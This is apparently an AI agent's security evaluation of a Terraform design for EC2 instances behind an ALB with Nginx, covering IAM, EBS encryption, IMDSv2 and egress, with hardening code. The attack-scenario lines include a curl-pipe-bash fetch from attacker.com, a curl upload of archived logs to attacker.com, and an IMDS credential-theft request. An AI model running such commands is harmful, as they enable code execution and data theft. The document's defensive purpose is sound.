# AWS Security Advisor Evaluation: EC2 ALB Nginx Infrastructure

**Feature**: EC2 Instance with ALB and Nginx Infrastructure  
**Branch**: `feature/ec2-alb-nginx-gh29`  
**Evaluation Date**: 2025-01-29  
**Reviewer**: AWS Security Advisor Agent  
**Scope**: Design artifacts in `specs/ec2-alb-nginx-gh29/`

---

## Executive Summary

This security evaluation assesses the Terraform design for deploying EC2 instances with Application Load Balancer and Nginx web server infrastructure against the **AWS Well-Architected Framework Security Pillar**. The design demonstrates **strong foundational security practices** with HTTPS enforcement, network isolation, and use of private registry modules. However, **4 Critical and High-priority security gaps** were identified that must be addressed before production deployment.

### Risk Summary

| Priority | Count | Status |
|----------|-------|--------|
| **Critical (P0)** | 1 | ⚠️ Requires immediate action |
| **High (P1)** | 3 | ⚠️ Fix before production |
| **Medium (P2)** | 4 | ⚡ Address in current sprint |
| **Low (P3)** | 2 | 📋 Add to backlog |

### Security Strengths ✅

1. **HTTPS-Only Enforcement**: ALB configured with post-quantum TLS policy (ELBSecurityPolicy-TLS13-1-2-Res-PQ-2025-09)
2. **Network Isolation**: Zero-trust architecture with EC2 instances not directly accessible from internet
3. **Module-First Architecture**: 100% private registry module usage (exceeds 90% requirement)
4. **Security Group Best Practices**: Security group references instead of CIDR blocks for dynamic access control

### Critical Security Gaps ⚠️

1. **Missing IAM Role Definition** (Critical): No concrete IAM policy specified for EC2 instances
2. **Missing EC2 Encryption at Rest** (High): EBS volumes lack encryption configuration
3. **No IMDSv2 Enforcement** (High): EC2 metadata service not hardened against SSRF attacks
4. **Excessive EC2 Egress** (High): Unrestricted internet egress increases attack surface

---

## Detailed Security Findings

### CRITICAL (P0) - Immediate Action Required

---

### 1. Missing IAM Role Least Privilege Implementation

**Risk Rating**: Critical  
**Justification**: While IAM roles are referenced throughout the design, **no concrete IAM policy is defined**. The data-model.md specifies generic AWS managed policies (`CloudWatchAgentServerPolicy`, `AmazonSSMManagedInstanceCore`) without analysis of actual permissions required. Overly permissive IAM roles enable privilege escalation and lateral movement if instances are compromised.

**Finding**: 
- File `data-model.md:260-275` defines IAM variables with generic managed policies
- File `plan.md:121` mentions "IAM Role: Minimal permissions" but provides no implementation
- No custom IAM policy document exists in `contracts/` directory
- Generic managed policies grant broader permissions than necessary for serving static content

**Impact**:
- **Privilege Escalation**: Attacker gaining shell access could leverage broad IAM permissions to access other AWS resources
- **Data Exfiltration**: SSM/CloudWatch policies may allow reading sensitive data from other instances
- **Lateral Movement**: Overly permissive roles enable pivoting to other AWS services
- **Compliance Violations**: Fails SEC03-BP02 (Grant least privilege access) from AWS Well-Architected Framework

**Detailed Permission Analysis**:
```
AmazonSSMManagedInstanceCore (arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore):
- ssm:UpdateInstanceInformation (needed)
- ssm:ListAssociations (NOT needed - no associations planned)
- ssm:ListInstanceAssociations (NOT needed)
- ssm:PutInventory (NOT needed - inventory not required)
- ssm:PutComplianceItems (NOT needed)
- ssm:PutConfigurePackageResult (NOT needed)
- ssm:UpdateAssociationStatus (NOT needed)
- ssm:UpdateInstanceAssociationStatus (NOT needed)
- ec2messages:* (needed for Session Manager)
- ssmmessages:* (needed for Session Manager)

CloudWatchAgentServerPolicy (arn:aws:iam::aws:policy/CloudWatchAgentServerPolicy):
- cloudwatch:PutMetricData (NOT needed - no custom metrics)
- ec2:DescribeVolumes (NOT needed - static content doesn't require volume metadata)
- ec2:DescribeTags (NOT needed)
- logs:CreateLogGroup (NOT needed - no application logging planned)
- logs:CreateLogStream (NOT needed)
- logs:PutLogEvents (NOT needed)
- logs:DescribeLogStreams (NOT needed)
```

**Recommendation**:
1. **Create custom IAM policy** with ONLY Session Manager permissions:
   ```json
   {
     "Version": "2012-10-17",
     "Statement": [
       {
         "Sid": "AllowSessionManagerCoreActions",
         "Effect": "Allow",
         "Action": [
           "ssm:UpdateInstanceInformation",
           "ssmmessages:CreateControlChannel",
           "ssmmessages:CreateDataChannel",
           "ssmmessages:OpenControlChannel",
           "ssmmessages:OpenDataChannel"
         ],
         "Resource": "*"
       },
       {
         "Sid": "AllowEC2MessagesForSessionManager",
         "Effect": "Allow",
         "Action": [
           "ec2messages:AcknowledgeMessage",
           "ec2messages:GetEndpoint",
           "ec2messages:GetMessages",
           "ec2messages:SendReply"
         ],
         "Resource": "*"
       }
     ]
   }
   ```

2. **Remove CloudWatchAgentServerPolicy** entirely (not needed for static content)

3. **Document IAM policy rationale** in `contracts/iam-policy.json` with permission justifications

4. **Implement IAM Access Analyzer** to validate least-privilege access:
   ```hcl
   resource "aws_accessanalyzer_analyzer" "ec2_nginx" {
     analyzer_name = "ec2-nginx-least-privilege"
     type          = "ACCOUNT"
     tags = {
       Purpose = "Validate EC2 IAM role least privilege"
     }
   }
   ```

5. **Use condition keys** to restrict SSM access to specific instances:
   ```json
   {
     "Condition": {
       "StringEquals": {
         "ssm:resourceTag/Project": "ec2-alb-nginx"
       }
     }
   }
   ```

**Code Example**:
```hcl
# Before (CRITICAL VULNERABILITY - Generic Managed Policies)
variable "iam_policy_arns" {
  description = "List of IAM policy ARNs to attach to instance role (least privilege)"
  type        = list(string)
  default = [
    "arn:aws:iam::aws:policy/CloudWatchAgentServerPolicy",  # ❌ Grants 12 permissions, need 0
    "arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore"  # ❌ Grants 15+ permissions, need 6
  ]
}

# After (SECURE - Custom Least-Privilege Policy)
resource "aws_iam_policy" "ec2_nginx_least_privilege" {
  name        = "ec2-nginx-session-manager-only"
  description = "Minimal permissions for EC2 Nginx instances - Session Manager access only"
  
  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid    = "AllowSessionManagerCoreActions"
        Effect = "Allow"
        Action = [
          "ssm:UpdateInstanceInformation",
          "ssmmessages:CreateControlChannel",
          "ssmmessages:CreateDataChannel",
          "ssmmessages:OpenControlChannel",
          "ssmmessages:OpenDataChannel"
        ]
        Resource = "*"
      },
      {
        Sid    = "AllowEC2MessagesForSessionManager"
        Effect = "Allow"
        Action = [
          "ec2messages:AcknowledgeMessage",
          "ec2messages:GetEndpoint",
          "ec2messages:GetMessages",
          "ec2messages:SendReply"
        ]
        Resource = "*"
      }
    ]
  })
}

resource "aws_iam_role" "ec2_nginx_instance_role" {
  name = "ec2-nginx-instance-role"
  
  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Action = "sts:AssumeRole"
      Effect = "Allow"
      Principal = {
        Service = "ec2.amazonaws.com"
      }
    }]
  })
}

resource "aws_iam_role_policy_attachment" "session_manager_only" {
  role       = aws_iam_role.ec2_nginx_instance_role.name
  policy_arn = aws_iam_policy.ec2_nginx_least_privilege.arn
}

resource "aws_iam_instance_profile" "ec2_nginx" {
  name = "ec2-nginx-instance-profile"
  role = aws_iam_role.ec2_nginx_instance_role.name
}
```

**Source**: [AWS Well-Architected Framework - SEC03-BP02 Grant least privilege access - https://docs.aws.amazon.com/wellarchitected/2025-02-25/framework/sec_permissions_least_privileges.html]  
**Reference**: [IAM roles for Amazon EC2 - https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/iam-roles-for-amazon-ec2.html]  
**Reference**: [AWS IAM Access Analyzer - https://docs.aws.amazon.com/IAM/latest/UserGuide/what-is-access-analyzer.html]

**Effort**: Medium (45-60 minutes to create custom policy, validate permissions, and test Session Manager access)

---

## HIGH (P1) - Fix Before Production

---

### 2. Missing EBS Volume Encryption at Rest

**Risk Rating**: High  
**Justification**: EC2 instances lack explicit EBS encryption configuration. While design mentions "cost-optimized storage," **data at rest encryption is missing**, exposing sensitive data if storage media is compromised or improperly decommissioned. This is a **hard requirement** for compliance frameworks (PCI-DSS, HIPAA, SOC 2) and AWS best practices.

**Finding**:
- File `data-model.md:144-160` defines `root_volume_size` and `root_volume_type` but **no encryption parameters**
- File `plan.md` security controls (line 114-121) mention "encryption in transit" but omit "encryption at rest"
- No `encrypted = true` or `kms_key_id` specified in EC2 configuration
- Security checklist (plan.md:933) doesn't validate EBS encryption

**Impact**:
- **Data Breach Risk**: Unencrypted volumes expose data if physical drives are accessed (e.g., AWS datacenter compromise, decommissioned hardware)
- **Compliance Violations**: 
  - PCI-DSS 3.4: "Render PAN unreadable anywhere it is stored"
  - HIPAA §164.312(a)(2)(iv): "Encryption and decryption"
  - SOC 2 CC6.7: "Encryption of data at rest"
- **Regulatory Fines**: Non-compliance can result in penalties up to $20M (GDPR) or 4% of annual revenue
- **Reputational Damage**: Security incident disclosure requirements harm brand reputation

**AWS Default Behavior**:
- EBS volumes are **NOT encrypted by default** (opt-in per account/region)
- Even if account-level default encryption is enabled, Terraform should explicitly declare encryption

**Recommendation**:
1. **Enable EBS encryption** for all EC2 root and data volumes:
   ```hcl
   root_block_device {
     encrypted   = true
     kms_key_id  = aws_kms_key.ebs_encryption.arn  # or use AWS-managed key
     volume_type = "gp3"
     volume_size = 8
   }
   ```

2. **Use AWS KMS Customer Managed Keys (CMK)** for auditability and key rotation:
   ```hcl
   resource "aws_kms_key" "ebs_encryption" {
     description             = "KMS key for EBS volume encryption (EC2 Nginx)"
     deletion_window_in_days = 10
     enable_key_rotation     = true
     
     tags = {
       Project     = "ec2-alb-nginx"
       Environment = "development"
     }
   }
   
   resource "aws_kms_alias" "ebs_encryption" {
     name          = "alias/ec2-nginx-ebs-encryption"
     target_key_id = aws_kms_key.ebs_encryption.key_id
   }
   ```

3. **Enable EBS encryption by default** at account level (defense-in-depth):
   ```bash
   aws ec2 enable-ebs-encryption-by-default --region ap-southeast-1
   ```

4. **Document encryption standard** in `contracts/encryption-policy.md`

5. **Add EBS encryption validation** to security checklist

**Code Example**:
```hcl
# Before (HIGH RISK - No Encryption)
variable "root_volume_size" {
  description = "Root volume size in GB for EC2 instances"
  type        = number
  default     = 8
}

variable "root_volume_type" {
  description = "Root volume type for EC2 instances"
  type        = string
  default     = "gp3"
}
# ❌ No encryption configuration

# After (SECURE - Encrypted with CMK)
resource "aws_kms_key" "ebs_encryption" {
  description             = "KMS key for EBS volume encryption (EC2 Nginx instances)"
  deletion_window_in_days = 10
  enable_key_rotation     = true
  
  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid    = "Enable IAM User Permissions"
        Effect = "Allow"
        Principal = {
          AWS = "arn:aws:iam::${data.aws_caller_identity.current.account_id}:root"
        }
        Action   = "kms:*"
        Resource = "*"
      },
      {
        Sid    = "Allow EC2 to use the key"
        Effect = "Allow"
        Principal = {
          Service = "ec2.amazonaws.com"
        }
        Action = [
          "kms:Decrypt",
          "kms:GenerateDataKey",
          "kms:CreateGrant"
        ]
        Resource = "*"
        Condition = {
          StringEquals = {
            "kms:ViaService" = "ec2.ap-southeast-1.amazonaws.com"
          }
        }
      }
    ]
  })
  
  tags = {
    Project     = "ec2-alb-nginx"
    Environment = "development"
    ManagedBy   = "terraform"
  }
}

resource "aws_kms_alias" "ebs_encryption" {
  name          = "alias/ec2-nginx-ebs-encryption"
  target_key_id = aws_kms_key.ebs_encryption.key_id
}

module "ec2_instance" {
  source  = "app.terraform.io/ravi-panchal-org/ec2-instance/aws"
  version = "~> 6.1.4"
  
  # ... other configuration ...
  
  root_block_device = [{
    encrypted   = true
    kms_key_id  = aws_kms_key.ebs_encryption.arn
    volume_type = "gp3"
    volume_size = 8
    
    # Performance tuning for cost optimization
    iops       = 3000  # gp3 baseline (no extra cost)
    throughput = 125   # gp3 baseline (no extra cost)
    
    delete_on_termination = true
    
    tags = {
      Name        = "ec2-nginx-root-volume"
      Encrypted   = "true"
      Project     = "ec2-alb-nginx"
      Environment = "development"
    }
  }]
}
```

**Source**: [AWS Well-Architected Framework - SEC08-BP01 Implement secure key management - https://docs.aws.amazon.com/wellarchitected/latest/framework/sec_protect_data_rest_encrypt.html]  
**Reference**: [Amazon EBS encryption - https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html]  
**Reference**: [AWS Control Tower - CT.EC2.PR.7 Require Amazon EBS volumes to be encrypted at rest - https://docs.aws.amazon.com/controltower/latest/controlreference/ec2-rules.html]

**Effort**: Low (15-20 minutes to add KMS key and encryption configuration)

---

### 3. Missing IMDSv2 Enforcement

**Risk Rating**: High  
**Justification**: EC2 Instance Metadata Service (IMDS) is not configured to **require IMDSv2** (session-oriented requests). IMDSv1 is vulnerable to Server-Side Request Forgery (SSRF) attacks, allowing attackers to steal IAM role credentials through web application vulnerabilities.

**Finding**:
- File `plan.md:115` mentions "Metadata Protection: EC2 instances configured with IMDSv2 required" in security controls
- However, **no implementation exists** in data-model.md or contracts/
- No `metadata_options` configuration in EC2 module parameters
- IMDSv1 remains enabled by default, creating SSRF attack vector

**Impact**:
- **IAM Credential Theft**: Attacker exploiting SSRF vulnerability in Nginx or future applications can retrieve IAM role credentials
  ```bash
  # IMDSv1 attack (works without session token)
  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-nginx-instance-role
  ```
- **Privilege Escalation**: Stolen credentials enable API calls with EC2 instance IAM role permissions
- **Lateral Movement**: Access to other AWS resources within IAM policy scope
- **Compliance Risk**: AWS Security Hub flags IMDSv1 as high-severity misconfiguration

**SSRF Attack Scenario**:
1. Attacker finds SSRF vulnerability in web application (e.g., URL parameter allowing HTTP requests)
2. Attacker sends crafted request: `https://alb-dns/page?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`
3. Application server makes request to IMDS, returns IAM role credentials
4. Attacker uses stolen credentials for AWS API calls

**IMDSv2 Protection**:
- Requires PUT request to obtain session token before metadata access
- Session token expires after 6 hours (configurable 1 second - 6 hours)
- TTL=1 prevents token from being forwarded beyond instance
- SSRF attacks fail because attacker cannot forge two-step PUT → GET request

**Recommendation**:
1. **Enforce IMDSv2** with `http_tokens = "required"`:
   ```hcl
   metadata_options {
     http_tokens                 = "required"  # Enforce IMDSv2
     http_put_response_hop_limit = 1           # Prevent token forwarding
     http_endpoint               = "enabled"   # Keep metadata service enabled
   }
   ```

2. **Set hop limit to 1** to prevent Docker containers or forwarding attacks

3. **Test Nginx compatibility** with IMDSv2 (most modern software supports it)

4. **Monitor IMDSv1 usage** before full enforcement:
   ```hcl
   # Temporary: Allow IMDSv1 while monitoring
   http_tokens = "optional"
   
   # CloudWatch metric: MetadataNoToken
   # After confirming zero IMDSv1 calls, switch to "required"
   ```

5. **Add IMDSv2 validation** to security checklist

**Code Example**:
```hcl
# Before (HIGH RISK - IMDSv1 Enabled)
module "ec2_instance" {
  source  = "app.terraform.io/ravi-panchal-org/ec2-instance/aws"
  version = "~> 6.1.4"
  
  # ... other configuration ...
  # ❌ No metadata_options specified - defaults to IMDSv1 enabled
}

# After (SECURE - IMDSv2 Required)
module "ec2_instance" {
  source  = "app.terraform.io/ravi-panchal-org/ec2-instance/aws"
  version = "~> 6.1.4"
  
  # ... other configuration ...
  
  metadata_options = {
    http_endpoint               = "enabled"   # Keep metadata service enabled for IAM roles
    http_tokens                 = "required"  # ✅ ENFORCE IMDSv2 (blocks SSRF attacks)
    http_put_response_hop_limit = 1           # ✅ PREVENT token forwarding beyond instance
    instance_metadata_tags      = "disabled"  # Not needed for this use case
  }
}

# Validation: Test IMDSv2 enforcement
# IMDSv1 request (should fail with 401):
# curl http://169.254.169.254/latest/meta-data/

# IMDSv2 request (should succeed):
# TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
# curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

**Source**: [AWS Security Hub - EC2 instance allows access to IMDS using version 1 - https://docs.aws.amazon.com/securityhub/latest/userguide/exposure-ec2-instance.html]  
**Reference**: [Transition to using Instance Metadata Service Version 2 - https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instance-metadata-transition-to-version-2.html]  
**Reference**: [AWS Control Tower - CT.EC2.PR.1 Require IMDSv2 on EC2 launch templates - https://docs.aws.amazon.com/controltower/latest/controlreference/ec2-rules.html]

**Effort**: Low (10 minutes to add metadata_options configuration and validate)

---

### 4. Unrestricted EC2 Internet Egress

**Risk Rating**: High  
**Justification**: EC2 security group allows **unrestricted outbound access** to the internet (0.0.0.0/0 on ports 80 and 443). While necessary for package updates and AWS services, this creates an attack surface for **data exfiltration** and **command-and-control (C2) callbacks** if instances are compromised.

**Finding**:
- File `contracts/security-rules.hcl:64-79` configures EC2 egress to `0.0.0.0/0` on ports 80 and 443
- Justification provided: "Required for yum/dnf updates and AWS services (CloudWatch, Systems Manager)"
- File `contracts/security-rules.hcl:111-113` acknowledges trade-off but accepts risk for cost optimization
- No network-level egress controls (NACLs, AWS Network Firewall) planned

**Impact**:
- **Data Exfiltration**: Compromised instance can send sensitive data to external attacker-controlled servers
- **Command-and-Control (C2)**: Malware can establish persistent connection to attacker infrastructure
- **Cryptocurrency Mining**: Attacker installs mining software, consuming compute resources and inflating AWS bills
- **Lateral Movement Staging**: Compromised instance downloads additional attack tools
- **Compliance Gap**: Fails network segmentation requirements (NIST 800-53 SC-7, PCI-DSS 1.3.4)

**Attack Scenario**:
1. Attacker exploits Nginx vulnerability (CVE) or supply chain attack in dnf package
2. Attacker gains shell access to EC2 instance
3. Attacker downloads additional tools via HTTPS: `curl https://attacker.com/tools.sh | bash`
4. Attacker exfiltrates data: `tar czf /tmp/data.tgz /var/log && curl -X POST https://attacker.com -F "file=@/tmp/data.tgz"`
5. Attacker establishes C2 channel for persistent access

**Current Design Trade-Off Analysis**:
```
Option 1: Unrestricted egress (0.0.0.0/0:80,443) [CURRENT]
- Cost: $0/month
- Risk: High (data exfiltration, C2 callbacks)
- Operational complexity: Low

Option 2: VPC Endpoints (restrict to AWS services only)
- Cost: $14.40/month (Interface endpoints for CloudWatch Logs, Systems Manager)
- Risk: Medium (still allows package updates from internet)
- Operational complexity: Medium

Option 3: VPC Endpoints + HTTP Proxy (most secure)
- Cost: $20-30/month (VPC endpoints + proxy instance)
- Risk: Low (all egress logged and controlled)
- Operational complexity: High
```

**Recommendation**:
1. **Short-term (current sprint)**: Implement **AWS Network Firewall stateful rules** to restrict egress to known-good domains:
   ```hcl
   resource "aws_networkfirewall_rule_group" "ec2_nginx_egress" {
     capacity = 100
     name     = "ec2-nginx-allowed-egress"
     type     = "STATEFUL"
     
     rule_group {
       rules_source {
         stateful_rule {
           action = "PASS"
           header {
             destination      = "amazonlinux.ap-southeast-1.amazonaws.com"
             destination_port = "443"
             direction        = "FORWARD"
             protocol         = "HTTPS"
             source           = "10.0.0.0/8"  # VPC CIDR
             source_port      = "ANY"
           }
           rule_option {
             keyword = "sid:1"
           }
         }
         
         # Additional rules for AWS services
         stateful_rule {
           action = "PASS"
           header {
             destination      = ".amazonaws.com"
             destination_port = "443"
             direction        = "FORWARD"
             protocol         = "HTTPS"
             source           = "10.0.0.0/8"
             source_port      = "ANY"
           }
           rule_option {
             keyword = "sid:2"
           }
         }
       }
     }
   }
   ```

2. **Alternative (cost-optimized)**: Implement **VPC Endpoints** for critical AWS services:
   ```hcl
   # Gateway endpoint (FREE) for S3 (package repository mirrors)
   resource "aws_vpc_endpoint" "s3" {
     vpc_id          = data.aws_vpc.default.id
     service_name    = "com.amazonaws.ap-southeast-1.s3"
     route_table_ids = data.aws_route_tables.default.ids
   }
   
   # Interface endpoint ($7.20/month/AZ) for Systems Manager
   resource "aws_vpc_endpoint" "ssm" {
     vpc_id              = data.aws_vpc.default.id
     service_name        = "com.amazonaws.ap-southeast-1.ssm"
     vpc_endpoint_type   = "Interface"
     subnet_ids          = data.aws_subnets.default.ids
     security_group_ids  = [aws_security_group.vpc_endpoints.id]
     private_dns_enabled = true
   }
   
   # Interface endpoint ($7.20/month/AZ) for CloudWatch Logs (if needed in future)
   resource "aws_vpc_endpoint" "logs" {
     vpc_id              = data.aws_vpc.default.id
     service_name        = "com.amazonaws.ap-southeast-1.logs"
     vpc_endpoint_type   = "Interface"
     subnet_ids          = data.aws_subnets.default.ids
     security_group_ids  = [aws_security_group.vpc_endpoints.id]
     private_dns_enabled = true
   }
   
   # Update EC2 security group to allow egress to VPC endpoints only
   resource "aws_security_group_rule" "ec2_egress_to_endpoints" {
     type                     = "egress"
     from_port                = 443
     to_port                  = 443
     protocol                 = "tcp"
     security_group_id        = aws_security_group.ec2.id
     source_security_group_id = aws_security_group.vpc_endpoints.id
     description              = "HTTPS to VPC endpoints for AWS services"
   }
   ```

3. **Minimal (accept residual risk for dev)**: 
   - Keep current design but **add egress logging** via VPC Flow Logs
   - **Document accepted risk** in risk register
   - **Implement CloudWatch alarms** for anomalous egress patterns
   - **Restrict to development environment only** (not production)

4. **Add egress monitoring** regardless of mitigation chosen:
   ```hcl
   # VPC Flow Logs for egress monitoring
   resource "aws_flow_log" "ec2_egress_monitoring" {
     vpc_id               = data.aws_vpc.default.id
     traffic_type         = "ALL"
     iam_role_arn         = aws_iam_role.flow_logs.arn
     log_destination_type = "cloud-watch-logs"
     log_destination      = aws_cloudwatch_log_group.vpc_flow_logs.arn
     
     tags = {
       Name    = "ec2-nginx-egress-monitoring"
       Purpose = "Detect data exfiltration and C2 traffic"
     }
   }
   
   # CloudWatch alarm for high egress volume
   resource "aws_cloudwatch_metric_alarm" "high_egress" {
     alarm_name          = "ec2-nginx-high-egress-volume"
     comparison_operator = "GreaterThanThreshold"
     evaluation_periods  = 2
     metric_name         = "BytesOut"
     namespace           = "AWS/EC2"
     period              = 300
     statistic           = "Sum"
     threshold           = 10485760  # 10 MB in 5 minutes (adjust based on baseline)
     alarm_description   = "Alert on potential data exfiltration"
     alarm_actions       = [aws_sns_topic.security_alerts.arn]
   }
   ```

**Code Example**:
```hcl
# Before (HIGH RISK - Unrestricted Internet Egress)
egress_rules = {
  https_outbound = {
    description = "HTTPS for updates and AWS services"
    from_port   = 443
    to_port     = 443
    ip_protocol = "tcp"
    cidr_ipv4   = "0.0.0.0/0"  # ❌ ALLOWS ALL INTERNET DESTINATIONS
  }
  http_outbound = {
    description = "HTTP for package repositories"
    from_port   = 80
    to_port     = 80
    ip_protocol = "tcp"
    cidr_ipv4   = "0.0.0.0/0"  # ❌ ALLOWS ALL INTERNET DESTINATIONS
  }
}

# After - Option 1: VPC Endpoints (RECOMMENDED for cost-effectiveness)
# S3 Gateway Endpoint (FREE) for package repositories
resource "aws_vpc_endpoint" "s3" {
  vpc_id          = data.aws_vpc.default.id
  service_name    = "com.amazonaws.ap-southeast-1.s3"
  route_table_ids = data.aws_route_tables.default.ids
  
  tags = {
    Name    = "ec2-nginx-s3-endpoint"
    Purpose = "Package repository access (Amazon Linux repos)"
  }
}

# SSM Interface Endpoint ($7.20/month per AZ × 2 AZs = $14.40/month)
resource "aws_vpc_endpoint" "ssm" {
  vpc_id              = data.aws_vpc.default.id
  service_name        = "com.amazonaws.ap-southeast-1.ssm"
  vpc_endpoint_type   = "Interface"
  subnet_ids          = data.aws_subnets.default.ids
  security_group_ids  = [aws_security_group.vpc_endpoints.id]
  private_dns_enabled = true
  
  tags = {
    Name    = "ec2-nginx-ssm-endpoint"
    Purpose = "Session Manager access"
  }
}

# Security group for VPC endpoints
resource "aws_security_group" "vpc_endpoints" {
  name        = "ec2-nginx-vpc-endpoints-sg"
  description = "Security group for VPC endpoints"
  vpc_id      = data.aws_vpc.default.id
  
  ingress {
    description     = "HTTPS from EC2 instances"
    from_port       = 443
    to_port         = 443
    protocol        = "tcp"
    security_groups = [aws_security_group.ec2.id]
  }
  
  tags = {
    Name = "ec2-nginx-vpc-endpoints-sg"
  }
}

# Updated EC2 egress rules - Restricted to VPC endpoints
egress_rules = {
  to_vpc_endpoints = {
    description                  = "HTTPS to VPC endpoints for AWS services"
    from_port                    = 443
    to_port                      = 443
    ip_protocol                  = "tcp"
    referenced_security_group_id = aws_security_group.vpc_endpoints.id
  }
  # HTTP removed - package repos accessed via S3 gateway endpoint
}

# After - Option 2: Accept Risk with Monitoring (if VPC endpoints not viable)
# Keep unrestricted egress but add comprehensive monitoring
egress_rules = {
  https_outbound = {
    description = "HTTPS for updates and AWS services (monitored)"
    from_port   = 443
    to_port     = 443
    ip_protocol = "tcp"
    cidr_ipv4   = "0.0.0.0/0"
  }
  http_outbound = {
    description = "HTTP for package repositories (monitored)"
    from_port   = 80
    to_port     = 80
    ip_protocol = "tcp"
    cidr_ipv4   = "0.0.0.0/0"
  }
}

# Add VPC Flow Logs for egress monitoring
resource "aws_flow_log" "ec2_egress" {
  vpc_id               = data.aws_vpc.default.id
  traffic_type         = "ALL"
  iam_role_arn         = aws_iam_role.flow_logs.arn
  log_destination_type = "cloud-watch-logs"
  log_destination      = aws_cloudwatch_log_group.vpc_flow_logs.arn
}

# CloudWatch alarm for anomalous egress
resource "aws_cloudwatch_metric_alarm" "suspicious_egress" {
  alarm_name          = "ec2-nginx-suspicious-egress"
  comparison_operator = "GreaterThanThreshold"
  evaluation_periods  = 1
  metric_name         = "BytesOut"
  namespace           = "AWS/EC2"
  period              = 300
  statistic           = "Sum"
  threshold           = 10485760  # 10 MB
  alarm_description   = "Potential data exfiltration detected"
  treat_missing_data  = "notBreaching"
}
```

**Risk Acceptance Statement** (if choosing minimal approach):
```
ACCEPTED RISK: Unrestricted EC2 internet egress (0.0.0.0/0:80,443)

Environment: Development only
Justification: Cost optimization ($14.40/month savings by avoiding VPC endpoints)
Compensating Controls:
- VPC Flow Logs enabled for egress traffic monitoring
- CloudWatch alarms for anomalous egress patterns
- Development environment with no production data
- Regular security patching via automated updates
- Limited blast radius (static content only, no databases)

Risk Owner: [DevOps Team Lead]
Review Date: [Quarterly]
Production Blocker: YES - Must implement VPC endpoints before production deployment
```

**Source**: [AWS PrivateLink - Access AWS services through AWS PrivateLink - https://docs.aws.amazon.com/vpc/latest/privatelink/privatelink-access-aws-services.html]  
**Reference**: [AWS Well-Architected Framework - SEC05-BP01 Create network layers - https://docs.aws.amazon.com/wellarchitected/latest/framework/sec_network_protection_create_layers.html]  
**Reference**: [VPC Endpoints - https://docs.aws.amazon.com/vpc/latest/privatelink/vpc-endpoints.html]

**Effort**: 
- VPC Endpoints: Medium (60-90 minutes to implement S3 gateway + SSM interface endpoints)
- Monitoring only: Low (30 minutes to enable VPC Flow Logs and CloudWatch alarms)

---

## MEDIUM (P2) - Address in Current Sprint

---

### 5. Missing ALB Access Logs

**Risk Rating**: Medium  
**Justification**: Application Load Balancer **access logs are not enabled**, preventing forensic analysis during security incidents. Without access logs, it's impossible to identify attack patterns, trace malicious requests, or investigate security events.

**Finding**:
- File `plan.md` does not mention ALB access logging configuration
- File `contracts/alb-listener.hcl` defines HTTPS listener but no logging parameters
- Security checklist (plan.md:935) lists "ALB access logs enabled (optional for dev)" but doesn't enforce it

**Impact**:
- **No Incident Response Capability**: Cannot identify attack source IPs, request patterns, or timeline during investigations
- **Compliance Gaps**: Audit log requirements (SOC 2 CC7.2, PCI-DSS 10.2, NIST 800-53 AU-2)
- **No Threat Intelligence**: Cannot detect reconnaissance, brute force, or DDoS attack patterns
- **Limited Troubleshooting**: Cannot diagnose intermittent issues or performance problems

**Useful Log Data for Security**:
- Source IP addresses (identify attackers, geographic anomalies)
- User-Agent strings (identify automated tools, scanners)
- Request paths (detect directory traversal, SQL injection attempts)
- HTTP status codes (identify brute force, error exploitation)
- SSL cipher and protocol (detect SSL downgrade attacks)
- Request timing (identify DDoS patterns)

**Recommendation**:
1. **Enable ALB access logs** to S3 bucket:
   ```hcl
   resource "aws_s3_bucket" "alb_logs" {
     bucket = "ec2-nginx-alb-logs-${data.aws_caller_identity.current.account_id}"
     
     tags = {
       Purpose = "ALB access logs for security monitoring"
     }
   }
   
   resource "aws_s3_bucket_lifecycle_configuration" "alb_logs" {
     bucket = aws_s3_bucket.alb_logs.id
     
     rule {
       id     = "delete-old-logs"
       status = "Enabled"
       
       expiration {
         days = 90  # Retain logs for 90 days
       }
       
       transition {
         days          = 30
         storage_class = "STANDARD_IA"  # Move to cheaper storage after 30 days
       }
     }
   }
   
   resource "aws_s3_bucket_public_access_block" "alb_logs" {
     bucket = aws_s3_bucket.alb_logs.id
     
     block_public_acls       = true
     block_public_policy     = true
     ignore_public_acls      = true
     restrict_public_buckets = true
   }
   
   resource "aws_s3_bucket_policy" "alb_logs" {
     bucket = aws_s3_bucket.alb_logs.id
     
     policy = jsonencode({
       Version = "2012-10-17"
       Statement = [{
         Sid    = "AllowALBAccessLogs"
         Effect = "Allow"
         Principal = {
           AWS = "arn:aws:iam::114774131450:root"  # ELB service account for ap-southeast-1
         }
         Action   = "s3:PutObject"
         Resource = "${aws_s3_bucket.alb_logs.arn}/*"
       }]
     })
   }
   
   # Configure ALB to write access logs
   module "alb" {
     # ... existing configuration ...
     
     access_logs = {
       enabled = true
       bucket  = aws_s3_bucket.alb_logs.id
       prefix  = "alb-access-logs"
     }
   }
   ```

2. **Implement log analysis** with Amazon Athena:
   ```sql
   -- Create Athena table for ALB logs
   CREATE EXTERNAL TABLE IF NOT EXISTS alb_logs (
     type string,
     time string,
     elb string,
     client_ip string,
     client_port int,
     target_ip string,
     target_port int,
     request_processing_time double,
     target_processing_time double,
     response_processing_time double,
     elb_status_code int,
     target_status_code string,
     received_bytes bigint,
     sent_bytes bigint,
     request_verb string,
     request_url string,
     request_proto string,
     user_agent string,
     ssl_cipher string,
     ssl_protocol string
   )
   ROW FORMAT SERDE 'org.apache.hadoop.hive.serde2.RegexSerDe'
   WITH SERDEPROPERTIES (
     'serialization.format' = '1',
